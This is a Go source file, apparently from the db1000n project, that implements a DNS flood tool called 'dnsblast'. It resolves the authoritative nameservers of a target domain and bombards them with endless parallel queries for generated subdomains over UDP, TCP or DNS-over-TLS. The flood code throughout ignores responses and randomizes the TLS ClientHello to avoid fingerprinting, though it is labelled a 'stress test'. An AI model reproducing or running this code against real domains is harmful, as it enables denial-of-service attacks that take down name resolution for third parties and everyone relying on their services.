package dnsblast

import (
	"context"
	"crypto/tls"
	"fmt"
	"log"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/Arriven/db1000n/src/metrics"

	"github.com/Arriven/db1000n/src/utils"
	"github.com/miekg/dns"
	utls "github.com/refraction-networking/utls"
)

// Useful contants
const (
	DefaultDNSPort        = 53
	DefaultDNSOverTLSPort = 853

	UDPProtoName    = "udp"
	TCPProtoName    = "tcp"
	TCPTLSProtoName = "tcp-tls"
)

// Config contains all the necessary configuration for dns-blast
type Config struct {
	RootDomain      string
	Protocol        string        // "udp", "tcp", "tcp-tls"
	SeedDomains     []string      // Used to generate domain names using the Distinct Heavy Hitter algorithm
	Delay           time.Duration // The delay between two packets to send
	ParallelQueries int
}

// DNSBlaster is a main worker struct for the package
type DNSBlaster struct{}

// Start starts the job based on provided configuration
func Start(ctx context.Context, config *Config) error {
	defer utils.PanicHandler()

	log.Printf("[DNS BLAST] igniting the blaster, parameters to start: "+
		"[rootDomain=%s; proto=%s; seeds=%v; delay=%s; parallelQueries=%d]",
		config.RootDomain, config.Protocol, config.SeedDomains, config.Delay, config.ParallelQueries)

	nameservers, err := getNameservers(config.RootDomain, config.Protocol)
	if err != nil {
		metrics.IncDNSBlast(config.RootDomain, "", config.Protocol, metrics.StatusFail)
		return fmt.Errorf("failed to resolve nameservers for the root domain [rootDomain=%s]: %s",
			config.RootDomain, err)
	}

	log.Printf("[DNS BLAST] nameservers resolved for the root domain [rootDomain=%v]: %v",
		config.RootDomain, nameservers)

	blaster := NewDNSBlaster()

	stressTestParameters := &StressTestParameters{
		Delay:           config.Delay,
		Protocol:        config.Protocol,
		SeedDomains:     config.SeedDomains,
		ParallelQueries: config.ParallelQueries,
	}

	for _, nameserver := range nameservers {
		go func(nameserver string, parameters *StressTestParameters) {
			defer utils.PanicHandler()

			if err := blaster.ExecuteStressTest(ctx, nameserver, parameters); err != nil {
				metrics.IncDNSBlast(config.RootDomain, "", config.Protocol, metrics.StatusFail)
				log.Printf("[DNS BLAST] stress test finished with error "+
					"[nameserver=%s; proto=%s; seeds=%v; delay=%s; parallelQueries=%d]: %s",
					nameserver, parameters.Protocol, parameters.SeedDomains, parameters.Delay, parameters.ParallelQueries, err)
				return
			}
		}(nameserver, stressTestParameters)
	}

	return nil
}

// NewDNSBlaster returns properly initialized blaster instance
func NewDNSBlaster() *DNSBlaster {
	return &DNSBlaster{}
}

// StressTestParameters contains parameters for a single stress test
type StressTestParameters struct {
	Delay           time.Duration
	ParallelQueries int
	Protocol        string
	SeedDomains     []string
}

// ExecuteStressTest executes a stress test based on parameters
func (rcv *DNSBlaster) ExecuteStressTest(ctx context.Context, nameserver string, parameters *StressTestParameters) error {
	defer utils.PanicHandler()

	var (
		awaitGroup    sync.WaitGroup
		reusableQuery = &QueryParameters{
			HostAndPort: nameserver,
			QName:       "", // Will be generated on each cycle
			QType:       dns.TypeA,
		}

		keepAliveCounter  = 0
		keepAliveReminder = 256
		nextLoopTicker    = time.NewTicker(parameters.Delay)
	)
	sharedDNSClient := newDefaultDNSClient(parameters.Protocol)
	dhhGenerator, err := NewDistinctHeavyHitterGenerator(parameters.SeedDomains)
	if err != nil {
		metrics.IncDNSBlast(nameserver, "", parameters.Protocol, metrics.StatusFail)
		return fmt.Errorf("failed to bootstrap the distinct heavy hitter generator: %s", err)
	}

	defer dhhGenerator.Cancel()
	defer nextLoopTicker.Stop()

blastLoop:
	for reusableQuery.QName = range dhhGenerator.Next() {
		if keepAliveCounter == keepAliveReminder {
			log.Printf("[DNS BLAST] Still blasting to [server=%s], OK!", reusableQuery.HostAndPort)
			keepAliveCounter = 0
		} else {
			keepAliveCounter++
		}

		select {
		case <-ctx.Done():
			log.Printf("[DNS BLAST] DNS stress is canceled, OK!")
			break blastLoop
		default:
			// Keep going
		}

		awaitGroup.Add(parameters.ParallelQueries)
		for i := 0; i < parameters.ParallelQueries; i++ {
			go func() {
				defer utils.PanicHandler()
				rcv.SimpleQueryWithNoResponse(sharedDNSClient, reusableQuery)
				awaitGroup.Done()
			}()
		}
		awaitGroup.Wait()

		select {
		case <-ctx.Done():
			log.Printf("[DNS BLAST] DNS stress is canceled, OK!")
			break blastLoop
		case <-nextLoopTicker.C:
			continue blastLoop
		}
	}

	return nil
}

// QueryParameters contains parameters of a single dns query
type QueryParameters struct {
	HostAndPort string
	QName       string
	QType       uint16
}

// Response is a dns response struct
type Response struct {
	WithErr bool
	Err     error
	Latency time.Duration
}

// SimpleQuery performs a simple dns query based on parameters
func (rcv *DNSBlaster) SimpleQuery(sharedDNSClient *dns.Client, parameters *QueryParameters) *Response {
	question := new(dns.Msg).
		SetQuestion(dns.Fqdn(parameters.QName), parameters.QType)

	co, err := sharedDNSClient.Dial(parameters.HostAndPort)
	if err != nil {
		return &Response{
			WithErr: err != nil,
			Err:     err,
		}
	}

	// Upgrade connection to use randomized ClientHello for TCP-TLS connections
	if sharedDNSClient.Net == TCPTLSProtoName {
		co.Conn = utls.UClient(co, &utls.Config{InsecureSkipVerify: true}, utls.HelloRandomized)
	}
	defer co.Close()

	_, rtt, err := sharedDNSClient.ExchangeWithConn(question, co)
	return &Response{
		WithErr: err != nil,
		Err:     err,
		Latency: rtt,
	}
}

// SimpleQueryWithNoResponse is like SimpleQuery but with optimizations enabled by not needing a response
func (rcv *DNSBlaster) SimpleQueryWithNoResponse(sharedDNSClient *dns.Client, parameters *QueryParameters) {
	question := new(dns.Msg).
		SetQuestion(dns.Fqdn(parameters.QName), parameters.QType)
	seedDomain := getSeedDomain(parameters.QName)
	co, err := sharedDNSClient.Dial(parameters.HostAndPort)
	if err != nil {
		log.Printf("[DNS BLAST] failed to dial remote host [host=%s] to do the DNS query: %s",
			parameters.HostAndPort, err)
		metrics.IncDNSBlast(parameters.HostAndPort, seedDomain, sharedDNSClient.Net, metrics.StatusFail)
		return
	}
	// Upgrade connection to use randomized ClientHello for TCP-TLS connections
	if sharedDNSClient.Net == TCPTLSProtoName {
		co.Conn = utls.UClient(co, &utls.Config{InsecureSkipVerify: true}, utls.HelloRandomized)
	}
	defer co.Close()

	_, _, err = sharedDNSClient.Exchange(question, parameters.HostAndPort)
	if err != nil {
		metrics.IncDNSBlast(parameters.HostAndPort, seedDomain, sharedDNSClient.Net, metrics.StatusFail)
		log.Printf("[DNS BLAST] failed to complete the DNS query: %s", err)
		return
	}
	metrics.IncDNSBlast(parameters.HostAndPort, seedDomain, sharedDNSClient.Net, metrics.StatusSuccess)
}

const (
	dialTimeout  = 1 * time.Second        // Let's not wait long if the server cannot be dialled, we all know why
	writeTimeout = 500 * time.Millisecond // Longer write timeout than read timeout just to make sure the query is uploaded
	readTimeout  = 300 * time.Millisecond // Not really interested in reading responses
)

func newDefaultDNSClient(proto string) *dns.Client {
	c := &dns.Client{
		Dialer: &net.Dialer{
			Timeout: dialTimeout,
		},
		DialTimeout:  dialTimeout,
		WriteTimeout: writeTimeout,
		ReadTimeout:  readTimeout,
		Net:          proto,
	}

	if c.Net == TCPTLSProtoName {
		c.TLSConfig = &tls.Config{
			InsecureSkipVerify: true,
		}
	}

	return c
}

func getNameservers(rootDomain string, protocol string) (res []string, err error) {
	port := DefaultDNSPort
	if protocol == TCPTLSProtoName {
		port = DefaultDNSOverTLSPort
	}

	nameservers, err := net.LookupNS(rootDomain)
	if err != nil {
		return nil, err
	}

	for _, nameserver := range nameservers {
		res = append(res, net.JoinHostPort(nameserver.Host, strconv.Itoa(port)))
	}

	return res, nil
}

// getSeedDomain cut last subdomain part and root domain "." (dot). From <value>="test.example.com." returns "example.com"
func getSeedDomain(value string) string {
	index := strings.Index(value, ".")
	// -1 to remove "." (dot) at end
	return value[index+1 : len(value)-1]
}
